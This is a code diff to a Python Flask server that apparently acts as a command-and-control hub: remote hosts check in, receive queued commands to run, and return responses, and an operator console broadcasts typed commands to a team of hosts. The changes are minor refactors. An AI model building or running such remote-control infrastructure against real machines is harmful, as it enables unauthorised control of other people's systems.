@@ -54,6 +54,7 @@ def getCommands(identifier):
     Returns a list of commands for the client to run
     """
     try:
+        checkIn(identifier)
         return HOSTS[identifier].getQueuedCommands()
     except:
         return '{"command_count":"69420"}'
@@ -114,8 +115,10 @@ def addCommand(identifier):
     Takes in a POST request with a command and adds it to the host's queue.
     """
     data = request.json
-    debugPrint(f"Adding command: \"{data['command']}\" to host: {identifier}")
     command = data["command"]
+    if command == "":
+        return "0"
+    debugPrint(f"Adding command: \"{data['command']}\" to host: {identifier}")
     return HOSTS[identifier].addCommand(command) #Returns the command ID
 
 @app.route("/hosts/<identifier>/responses", methods=["POST"])
@@ -125,6 +128,8 @@ def getResponses(identifier):
     """
     data = request.json
     cmd_id = data["cmd_id"]
+    if cmd_id == "0":
+        return "None"
     return HOSTS[identifier].getResponse(cmd_id)
 
 def getInfoByIP(IP):
@@ -179,15 +184,14 @@ def createHost(host):
         debugPrint(f"Added host: {newHost} to TEAM {team}")
         debugPrint(f"Added host: {newHost} to HOSTNAME {hostname}")
 
-def checkIn(hostname):
+def checkIn(identifier):
     """
     Updates host to 'alive' status and updates the last check-in timer.
 
-    :param hostname - Host ID
+    :param identifier - Host ID
     """
-    host = HOSTS[hostname]
-    host.alive = True
-    host.lastCheckIn = datetime.now().strftime("%H:%M:%S")
+    HOSTS[identifier].checkIn()
+    debugPrint("Check-in for host: " + identifier + " at " + str(HOSTS[identifier].lastCheckIn))
 
 def debugPrint(statement):
     """
@@ -195,6 +199,16 @@ def debugPrint(statement):
     """
     if DEBUG:
         print("[SERVER] " + statement)
+
+@app.route("/api/getCheckInTimes", methods=["POST"])
+def checkInTime():
+    """
+    Returns a string of the time since the last check-in for every host.
+    """
+    time = ""
+    for host in HOSTS:
+        time += f"{host} - {HOSTS[host].getTimeSinceLastCheckIn()}\n"
+    return time
 
 def main():
     global DEBUG
@@ -211,7 +225,6 @@ def main():
     website.start()
     while 1:
         command = input()
-        # HOSTS["unknown.unknown1"].addCommand(command)
         for host in TEAMS["unknown"].hosts:
             host.addCommand(command)
 
